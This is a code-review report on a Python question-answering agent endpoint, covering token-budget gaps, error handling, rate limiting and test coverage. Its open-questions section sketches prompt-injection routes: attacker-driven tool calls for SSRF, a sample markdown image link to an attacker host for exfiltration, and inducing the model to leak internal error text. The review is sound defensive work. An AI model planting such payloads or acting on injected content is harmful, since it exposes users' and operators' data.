# Redteam review: `/ask` research agent (`agent.py`, `test_agent.py`)

**Reviewer setup:** This is a single reviewer with no tools. I did not write the work, but I could not run any code, so no subagent or other seats ran. Every "CONFIRMED" result below comes from reading and tracing deterministic Python semantics. None of the reproductions have been executed.

**VERDICT: SHIP WITH FIXES.** I found no confirmed High or Critical issues. However, the token cap, which is the main spending control, fails open and only stops spending after it has happened. There is also no ceiling on total spend across all users. One unverified question could turn into a Critical issue (S1), and it should be settled before the announcement.

**CONFIDENCE: low.** Three things limit it:
- I had no tools, so nothing was run.
- The LLM wrapper, the tools, the auth middleware and the client renderer were not supplied.
- The most serious risks sit in those missing pieces.

## INPUTS LEDGER

| Input | Status | Matters? |
|---|---|---|
| `request.md` | Seen | Yes |
| `context.md` | Seen | Yes |
| `agent.py` | Seen | Yes |
| `test_agent.py` | Seen | Yes |
| `llm` wrapper (does it return `"tokens"`? include input tokens? cap output? set a timeout or system prompt?) | Not seen | **Yes.** The token cap depends on it. |
| `tools` dict (which tools the model can call) | Not seen | **Yes.** It decides how far prompt injection can reach. |
| Web framework and auth middleware (where `request["user"]` comes from) | Not seen | **Yes.** It decides whether auth and the rate limit hold at all. |
| Client that renders `answer` | Not seen | Yes. XSS or exfiltration through markdown or images. |
| Deployment config (workers, threads, restarts) | Not seen | Yes. The rate limit lives in memory, per process. |
| Test run output ("6 tests pass") | Not seen | Low. My trace says all 6 pass. |

## COVERAGE

- **Scope:** the whole work.
- **Checked:**
  - `request.md` and `context.md`
  - `agent.py`: the module constants, `run_agent` and `ask_endpoint`
  - `test_agent.py`: all 6 tests
  - The module docstring's claims ("input, turn, token and request caps", "one process")
- **Not checked (not supplied):** the LLM wrapper, the tools, the auth/framework layer, the renderer and the deployment config.
- **Hidden text:** the supplied text contains nothing addressed to the reviewer and no visible hidden characters. I could not do a byte-level scan for zero-width or bidi characters without tools.

## SEATS AND GATE

- **Sensitivity gate:** no personal data, credentials or confidential material found.
- **Seats:** only the local reviewer ran. No cross-vendor seats were requested at standard depth.

## FINDINGS

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | Medium | CONFIRMED (trace) | B | `agent.py:23` `spent += reply.get("tokens", 0)` | The token cap fails open. A reply without a `tokens` key counts as zero. | The real wrapper reports usage under another key (for example `usage.output_tokens`), or omits it. `spent` stays at 0, so `MAX_TOKENS_PER_REQUEST` never fires. Every request can then run 6 full billed calls, limited only by the turn cap and the model's own limits. | **Fix:** require an integer `tokens >= 0` on every reply and raise `BudgetExceeded` if it is missing or invalid. Better, compute it from the provider's usage object, counting input and output tokens. **Repro (not run):** a fake LLM returns `{"tool":"t","args":{},"usage":{"output_tokens":50000}}`. Expected: `{"error":"token budget for this request"}`. Observed by trace: `{"error":"turn limit"}` after 6 calls. | a✓ b✓ c✗ d? |
| F2 | Medium | CONFIRMED (trace) | B | `agent.py:22-25` | The cap is checked only after the money is spent, and `llm(messages)` is never told the remaining budget. | One call can bill up to the model's maximum output before the check runs, so the "20000-token" cap can be overshot by a whole call. | **Fix:** pass `max_tokens=min(per_call_cap, MAX_TOKENS_PER_REQUEST - spent - est_input)` to the LLM, and refuse the call if the remainder is too small. **Repro (not run):** fake LLM replies with tokens `[19999, 100000]` (a tool call, then an answer). Assert that the sum of reported tokens is ≤ `MAX_TOKENS_PER_REQUEST`. By trace it fails: the sum is 119999. | a✓ b✓ c✗ d? |
| F3 | Medium | CONFIRMED (absence in code) | B/A | `agent.py:5-9`, `ask_endpoint` | Spending is capped only per user per hour. There is no global hourly or daily budget and no kill switch. | On the public internet, N accounts × 20 req/h × 20k tokens = N × 400k tokens/h. For example, 1,000 scripted sign-ups come to about 400M tokens/h billed to the account. | **Fix:** add a shared global token counter (hourly and daily) checked before each LLM call, plus an operator kill switch and a spend alert. **Repro (not run):** for 100 distinct users, send 20 requests each with `tokens: 20000` replies. All 2,000 succeed and nothing refuses. | a✓ b✓ c✗ d? |
| F4 | Medium | CONFIRMED (trace) | B | `test_agent.py` (whole file) | The tests never exercise the token cap or the rate-window expiry. `test_a_model_that_never_stops` asserts `len(calls) <= MAX_TURNS`, which would also pass with 0 calls. | Delete `agent.py:24-25` (the token check) and all 6 tests still pass. A regression in the main spending control would ship green. | **Fix:** add tests for (1) the cap trips on cumulative tokens, (2) a missing `tokens` key is refused (F1), (3) per-call max is honored (F2), (4) a request after 3600 s is allowed again, using the injected `now`, (5) `len(calls) == MAX_TURNS`. **Repro:** the mutation just described. | a✓ b✓ c✗ d✓ |
| F5 | Low | CONFIRMED (trace) | B | `agent.py:53` `request["question"]` | A missing `question` raises a `KeyError` that is never caught (only `BudgetExceeded` is caught). The attempt still counts against the rate limit. | `POST /ask` with no question returns a framework 500, possibly with a traceback depending on the framework. | **Fix:** use `request.get("question")` and let `run_agent`'s type check refuse it. **Repro (not run):** `ask_endpoint({"user":"u"}, llm, {})` raises `KeyError: 'question'`. Expected: `{"error":"question must be text"}`. | a✓ b✓ c✗ d✓ |
| F6 | Low | CONFIRMED (trace) | B | `agent.py:36` `return reply["answer"]` | A reply with neither `tool` nor `answer` (refusal, empty, malformed) raises an uncaught `KeyError` after the tokens were already billed. | The model returns an empty or refusal shape, and the user gets a 500. | **Fix:** `answer = reply.get("answer")`; if it is not a string, raise or return a controlled error. **Repro (not run):** fake LLM returns `{"tokens":1}`. Observed: `KeyError`. Expected: `{"error":...}`. | a✓ b✓ c✗ d? |
| F7 | Low | CONFIRMED (trace) | B | `agent.py:22` `reply = llm(messages)` | Exceptions from the LLM (network errors, provider 429, timeouts) propagate uncaught out of `ask_endpoint`. | A provider outage surfaces as raw 500s and possibly leaks internal error text through the framework. | **Fix:** catch the provider's exception types, log them, and return `{"error":"temporarily unavailable"}`. **Repro (not run):** an LLM that raises `RuntimeError("upstream")` makes `ask_endpoint` raise. | a✓ b✓ c✗ d? |
| F8 | Low | CONFIRMED (trace) | B | `agent.py:26-34`, last loop iteration | On turn 6, a requested tool still runs, but its result is never sent to the model because the loop exits with "turn limit". | That is a wasted tool call, and a real side effect if the tool has one. | **Fix:** on the final turn, refuse further tool calls (or ask for a final answer without tools) before executing. **Repro (not run):** in the never-stops test, count tool invocations: 6, while only 5 results are ever read. | a✓ b✓ c✗ d✓ |
| F9 | Low | PROBABLE | B | `agent.py:31-32` `result = f"error: {exc}"` | Raw tool exception text goes into the model's context, and the model can repeat it to a public user. | An attacker asks the model to call a tool with bad arguments and quote the error. Internal hostnames, paths or SQL fragments leak. | **Fix:** return a generic `"tool error"` to the model and log the details server-side. **Repro (not run):** a tool that raises `Exception("db at 10.0.0.5 failed")` plus a fake LLM that echoes the last tool message. The answer contains `10.0.0.5`. | a✓ b✗ c✗ d? |
| F10 | Low | CONFIRMED (trace) | B | `agent.py:44-48` `_seen` | Entries are pruned only when the same user calls again. Idle users stay in memory forever. | Memory grows with the total number of users who ever called. It is bounded, so it harms no one soon. | **Fix:** periodically evict keys whose newest hit is older than 3600 s, or use a TTL store (which also helps S4). **Repro (not run):** call once each as 10k distinct users, advance `now` 2 h. `len(_seen) == 10000`. | a✓ b✓ c✗ d✗ |

## NEEDS VALIDATION (no severity)

- **S1. Where does `request["user"]` come from?** This is the most important open question. If the framework builds `request` from the client's JSON body, or the middleware doesn't strip a client-supplied `user`, then anyone can claim any user string. That bypasses "signed-in users only" and makes the per-user rate limit worthless (rotate the string), which means unbounded billed spend. It would rate Critical.
  - *Settled by:* the auth middleware code that populates `request`.
- **S2. What can the tools do?** The question is attacker-controlled, and so is any fetched content. The model picks the tools and their arguments (`agent.py:31`). A fetch/URL tool means SSRF. A DB or file tool means data exposure. There is no allowlist or argument validation in this code.
  - *Settled by:* the `tools` dict and each tool's argument handling.
- **S3. How is `answer` rendered?** Model output is untrusted. If the client renders it as markdown or HTML, injected `<script>` or `![](https://attacker/?q=...)` gives XSS or data exfiltration.
  - *Settled by:* the client rendering code and the CSP.
- **S4. Is the "one process" claim true, and is it single-threaded?**
  - Multiple workers or restarts multiply or reset the in-memory limit.
  - Threaded handlers race on read-then-write at `agent.py:45-48`. Concurrent requests read the same `hits`, and the last write wins, losing updates.
  - *Settled by:* the server config (worker count, threads or async).
- **S5. Does the reported `tokens` value include input tokens?** The full history is re-sent each turn, so late calls carry roughly 2k + 5×4k characters of input. If only output is counted, real billing is well above the counted figure.
  - *Settled by:* the LLM wrapper.
- **S6. Does the LLM wrapper set a per-call `max_tokens`, a timeout and a system prompt?** This decides how big F2 really is, and whether hangs and prompt-injection resistance are handled anywhere.
- **S7. "6 tests pass."** My trace says yes, but nothing was run.

## REFUTED

- **An unknown tool name crashes the request.** Refuted: `tools[reply["tool"]]` sits inside the `try` (`agent.py:30-32`), so the `KeyError` is caught and fed back to the model.
- **Non-dict `args` crashes the request.** Refuted: the `TypeError` from `**args` is caught by the same `try`.
- **A huge tool result blows up the context.** Refuted: results are truncated to 4000 characters (`agent.py:33`), and a test covers it.
- **The agent can loop forever.** Refuted: the loop is bounded by `range(MAX_TURNS)`.
- **The tests are order-dependent through the shared `_seen`.** Refuted: `test_rate_limit` clears `_seen`, and the other tests stay far under 20 hits per user.

## WHAT HOLDS UP

- The input cap and type check run before any model call, and both are tested.
- Tool output is truncated.
- The turn cap is a hard bound.
- Tool errors don't crash the loop.
- The anonymous check exists and is tested.
- The rate limiter's logic is correct for one single-threaded process.

## UNVERIFIED CLAIMS

| Claim | How to confirm |
|---|---|
| Docstring: "token … caps" | Real only if the wrapper returns accurate total `tokens` (F1, S5). Test with a real call. |
| "One process serves the endpoint" | Check the deploy config (S4). |
| "Signed-in users only" | Depends on the middleware (S1). |
| "6 tests pass" | Run `python -m unittest test_agent` in a scratch copy. |

## QUESTIONS FOR THE AUTHOR

1. Is `request["user"]` set only by authenticated middleware, and can a client ever supply it?
2. What does `llm()` return for usage? Does it count input tokens, and does it cap output per call?
3. Which tools are wired in, and what arguments do they accept?
4. How many workers or threads serve `/ask`?
5. Is sign-up open, and is there any account-level abuse control?

## DECISION-MAKER SUMMARY

The agent's loop is sound, but its token cap silently turns off if the model wrapper doesn't report usage in exactly the expected field. It also only stops spending after a call is already billed, and nothing caps total spend across all users. Before announcing, add a global spend cap, enforce per-call output limits, and confirm that the user identity comes from real authentication. If that last point fails, anyone can run up the bill without limit.

## OWNER SUMMARY

The question-answering feature mostly works and has sensible limits on how long it runs. Its main money-saving limit can quietly stop working, and nothing stops many accounts together from running up a very large bill. We need to confirm how users are identified and add an overall spending ceiling before going public.

```json
{
  "schema_version": "2.3",
  "verdict": "SHIP WITH FIXES",
  "confidence": "low",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "agent.py", "status": "seen", "matters": true},
    {"item": "test_agent.py", "status": "seen", "matters": true},
    {"item": "llm wrapper", "status": "not_seen", "matters": true},
    {"item": "tools dict", "status": "not_seen", "matters": true},
    {"item": "auth middleware / framework", "status": "not_seen", "matters": true},
    {"item": "answer renderer (client)", "status": "not_seen", "matters": true},
    {"item": "deployment config", "status": "not_seen", "matters": true},
    {"item": "test run output", "status": "not_seen", "matters": false}
  ],
  "seats": [{"vendor": "local-reviewer-no-tools", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": false, "reason": ""},
  "coverage": {
    "checked": [
      {"unit": "request.md", "kind": "document"},
      {"unit": "context.md", "kind": "document"},
      {"unit": "agent.py", "kind": "file"},
      {"unit": "agent.py:run_agent", "kind": "function"},
      {"unit": "agent.py:ask_endpoint", "kind": "function"},
      {"unit": "test_agent.py", "kind": "file"},
      {"unit": "docstring claim: input, turn, token and request caps", "kind": "claim"},
      {"unit": "assumption: one process serves the endpoint", "kind": "assumption"}
    ],
    "not_checked": [
      {"unit": "llm wrapper", "reason": "not_supplied"},
      {"unit": "tools dict", "reason": "not_supplied"},
      {"unit": "auth middleware / framework", "reason": "not_supplied"},
      {"unit": "answer renderer (client)", "reason": "not_supplied"},
      {"unit": "deployment config", "reason": "not_supplied"},
      {"unit": "byte-level hidden-character scan", "reason": "no_tools"},
      {"unit": "test execution", "reason": "no_tools"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:23",
     "scenario": "The llm wrapper reports usage under a different key or omits it; reply.get('tokens', 0) counts 0, so MAX_TOKENS_PER_REQUEST never fires and each request runs 6 full billed calls.",
     "fix": "Require an integer tokens >= 0 (input + output) on every reply and raise BudgetExceeded if missing or invalid; derive it from the provider usage object.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Not executed (no tools). Fake llm returns {'tool':'t','args':{},'usage':{'output_tokens':50000}} each call; expect {'error':'token budget for this request'}; by trace observe {'error':'turn limit'} after 6 calls."},
    {"id": "F2", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:22-25",
     "scenario": "The budget is checked only after a call is billed and no remaining budget is passed to llm(), so one call can overshoot the 20000-token cap by its full output.",
     "fix": "Pass max_tokens = remaining budget minus estimated input to llm(); refuse the call if the remainder is too small.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Not executed (no tools). Fake llm replies tokens 19999 (tool call) then 100000 (answer); assert total reported tokens <= MAX_TOKENS_PER_REQUEST; by trace the total is 119999."},
    {"id": "F3", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:5-9, ask_endpoint",
     "scenario": "No global spend cap: N accounts x 20 req/h x 20k tokens = N x 400k tokens/h billed to the account (1,000 scripted accounts is about 400M tokens/h).",
     "fix": "Add a shared global hourly and daily token budget checked before each llm call, an operator kill switch, and spend alerting.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Not executed (no tools). For users u0..u99, send 20 requests each with a fake llm returning tokens 20000; all 2000 succeed and none is refused."},
    {"id": "F4", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "test_agent.py",
     "scenario": "No test covers the token cap or rate-window expiry, and the never-stops test passes with 0 calls; deleting agent.py:24-25 leaves all 6 tests green.",
     "fix": "Add tests for the cumulative token cap, a missing tokens key, per-call max, the 3600 s window expiry via injected now, and len(calls) == MAX_TURNS.",
     "answers": {"a": true, "b": true, "c": false, "d": true},
     "reproduction": "Not executed (no tools). Delete agent.py lines 24-25 in a scratch copy and run python -m unittest test_agent; by trace all 6 still pass."},
    {"id": "F5", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:53",
     "scenario": "POST /ask without 'question' raises an uncaught KeyError (500) and still counts against the rate limit.",
     "fix": "Use request.get('question') so run_agent's type check refuses it.",
     "answers": {"a": true, "b": true, "c": false, "d": true},
     "reproduction": "Not executed (no tools). ask_endpoint({'user':'u'}, llm, {}) raises KeyError; expected {'error':'question must be text'}."},
    {"id": "F6", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:36",
     "scenario": "A reply with neither tool nor answer raises an uncaught KeyError after billing; the user gets a 500.",
     "fix": "Use reply.get('answer'); if it is not a string, return a controlled error.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Not executed (no tools). Fake llm returns {'tokens':1}; observe KeyError from ask_endpoint; expected an {'error':...} dict."},
    {"id": "F7", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:22",
     "scenario": "Provider errors or timeouts raised by llm() propagate uncaught out of ask_endpoint as raw 500s.",
     "fix": "Catch the provider exception types, log them, and return a generic unavailable error.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Not executed (no tools). An llm that raises RuntimeError('upstream') makes ask_endpoint raise instead of returning an error dict."},
    {"id": "F8", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:26-34",
     "scenario": "On the final turn a requested tool executes but its result is never read before the turn-limit error; the call is wasted, including any side effects.",
     "fix": "Refuse tool execution on the last turn or request a final answer without tools.",
     "answers": {"a": true, "b": true, "c": false, "d": true},
     "reproduction": "Not executed (no tools). Count tool invocations in the never-stops scenario: 6 executed, only 5 results read by the model."},
    {"id": "F9", "status": "confirmed", "severity": "Low", "evidence_level": "PROBABLE", "track": "B",
     "location": "agent.py:31-32",
     "scenario": "Raw tool exception text enters the model context; an attacker can induce an error and have the model repeat internal details such as hosts or paths.",
     "fix": "Return a generic 'tool error' to the model and log the details server-side.",
     "answers": {"a": true, "b": false, "c": false, "d": false},
     "reproduction": "Not executed (no tools). A tool raising Exception('db at 10.0.0.5 failed') plus a fake llm that echoes the last tool message; the answer contains 10.0.0.5."},
    {"id": "F10", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "agent.py:44-48",
     "scenario": "_seen entries are pruned only when the same user calls again, so memory grows with the number of distinct users ever seen.",
     "fix": "Periodically evict keys whose newest hit is older than 3600 s, or use a TTL store.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Not executed (no tools). Call once each as 10k distinct users, advance now by 2 h; len(_seen) remains 10000."},
    {"id": "S1", "status": "needs_validation", "track": "B", "location": "agent.py:42",
     "suspicion": "If request['user'] can be client-supplied, login and the per-user rate limit are bypassed, giving unbounded billed spend.",
     "unresolved_fact": "Whether auth middleware alone populates request['user'] from a verified session."},
    {"id": "S2", "status": "needs_validation", "track": "B", "location": "agent.py:31",
     "suspicion": "Prompt injection through the question or tool results drives tool calls with attacker-chosen arguments (SSRF, data access).",
     "unresolved_fact": "Which tools exist and how each validates its arguments."},
    {"id": "S3", "status": "needs_validation", "track": "B", "location": "agent.py:54",
     "suspicion": "Untrusted model answer rendered as markdown or HTML allows XSS or image-link exfiltration.",
     "unresolved_fact": "How the client renders answer, and the CSP in force."},
    {"id": "S4", "status": "needs_validation", "track": "B", "location": "agent.py:1, 45-48",
     "suspicion": "Multiple workers or restarts reset or multiply the in-memory limit; threaded handlers lose updates on _seen.",
     "unresolved_fact": "The server's worker count and threading or async model."},
    {"id": "S5", "status": "needs_validation", "track": "B", "location": "agent.py:23",
     "suspicion": "Counted tokens exclude re-sent input tokens, so real billing exceeds the cap.",
     "unresolved_fact": "What the llm wrapper's tokens field contains."},
    {"id": "S6", "status": "needs_validation", "track": "B", "location": "agent.py:22",
     "suspicion": "No per-call output cap, timeout or system prompt is set anywhere.",
     "unresolved_fact": "The llm wrapper's configuration."},
    {"id": "S7", "status": "needs_validation", "track": "B", "location": "context.md",
     "suspicion": "The claim that 6 tests pass is unverified.",
     "unresolved_fact": "Output of python -m unittest test_agent in a scratch copy."}
  ],
  "refuted": [
    {"id": "C1", "candidate": "An unknown tool name crashes the request.", "evidence": "tools[...] is inside the try at agent.py:30-32; the KeyError is caught and fed back."},
    {"id": "C2", "candidate": "Non-dict args crash the request.", "evidence": "The TypeError from **args is caught by the same try."},
    {"id": "C3", "candidate": "A huge tool result blows up the context.", "evidence": "Truncated to MAX_TOOL_RESULT_CHARS at agent.py:33; covered by test_a_huge_tool_result_is_truncated."},
    {"id": "C4", "candidate": "The agent can loop forever.", "evidence": "The loop is range(MAX_TURNS)."},
    {"id": "C5", "candidate": "The tests are order-dependent through the shared _seen.", "evidence": "test_rate_limit clears _seen; the other tests stay far below 20 hits per user."}
  ]
}
```